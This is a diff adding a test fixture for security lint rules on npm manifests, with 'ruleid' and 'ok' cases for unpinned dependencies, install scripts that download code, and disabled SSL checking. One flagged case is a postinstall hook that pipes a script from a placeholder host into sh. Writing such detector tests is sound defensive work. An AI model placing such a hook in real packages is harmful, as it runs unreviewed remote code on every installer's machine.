@@ -1,0 +1,18 @@
+{
+  "dependencies": {
+    // ruleid: ai-npm-unpinned-dependency
+    "left-pad": "latest",
+    // ok: ai-npm-unpinned-dependency
+    "react": "^19.3.1"
+  },
+  "scripts": {
+    // ruleid: ai-npm-install-script-download
+    "postinstall": "curl -s https://x.example/y | sh",
+    // ok: ai-npm-install-script-download
+    "build": "tsc && vite build"
+  }
+}
+// ruleid: ai-npm-insecure-registry
+strict-ssl=false
+// ok: ai-npm-insecure-registry
+strict-ssl=true
